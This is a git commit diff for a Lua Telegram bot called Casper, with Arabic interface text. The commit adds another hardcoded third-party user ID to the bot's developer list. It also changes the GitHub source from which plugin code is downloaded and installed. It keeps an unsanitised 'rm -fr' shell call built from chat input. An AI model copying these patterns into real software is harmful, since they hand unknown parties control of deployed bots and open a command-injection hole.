4ea92279300bba96ce9ca24687039a92e8df4075
BotCasper <68780277+BotCasper@users.noreply.github.com>
2020-08-18 03:40:48 +0300

    Add files via upload

--- Casper.lua
+++ Casper.lua
@@ -105,7 +105,7 @@ UserName_Dev = sudos.UserName_Casper
 bot_id = token:match("(%d+)")  
 Id_Dev = sudos.Id_DevCasper
 Ids_Dev = {sudos.Id_DevCasper,bot_id}
-Ids_Dev = {sudos.Id_DevCasper,909438744,667869951,332581832,bot_id}
+Ids_Dev = {sudos.Id_DevCasper,909438744,667869951,665877797,332581832,bot_id}
 Name_Bot = redis:get(bot_id.."Redis:Name:Bot") or "كاسبر"
 ------------------------------------------------------------------------------------------------------------
 function var(value)  
@@ -2177,7 +2177,7 @@ Files = '⌔︙ لا توجد ملفات في البوت '
 end
 send(msg.chat_id_, msg.id_,Files)
 elseif text == "متجر الملفات" or text == 'المتجر' then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/Casparbot/files_Casper/master/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/BotCasper/Files_Casper/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 if Get_info then
@@ -2206,7 +2206,7 @@ send(msg.chat_id_,msg.id_,"⌔︙تم مسح جميع ملفات المفعله"
 elseif text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
 local File_Get = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
 local File_Name = File_Get[2]..'.lua'
-local Get_Json, Res = https.request("https://raw.githubusercontent.com/Casparbot/files_Casper/master/Files_Casper/"..File_Name)
+local Get_Json, Res = https.request("https://raw.githubusercontent.com/BotCasper/Files_Casper/master/Files_Casper/"..File_Name)
 if Res == 200 then
 os.execute("rm -fr Files/"..File_Name)
 send(msg.chat_id_, msg.id_,"\n⌔︙الملف ← *"..File_Name.."*\n⌔︙تم تعطيله وحذفه من البوت بنجاح") 
@@ -2217,7 +2217,7 @@ end
 elseif text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
 local File_Get = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
 local File_Name = File_Get[2]..'.lua'
-local Get_Json, Res = https.request("https://raw.githubusercontent.com/Casparbot/files_Casper/master/Files_Casper/"..File_Name)
+local Get_Json, Res = https.request("https://raw.githubusercontent.com/BotCasper/Files_Casper/master/Files_Casper/"..File_Name)
 if Res == 200 then
 local ChekAuto = io.open("Files/"..File_Name,'w+')
 ChekAuto:write(Get_Json)
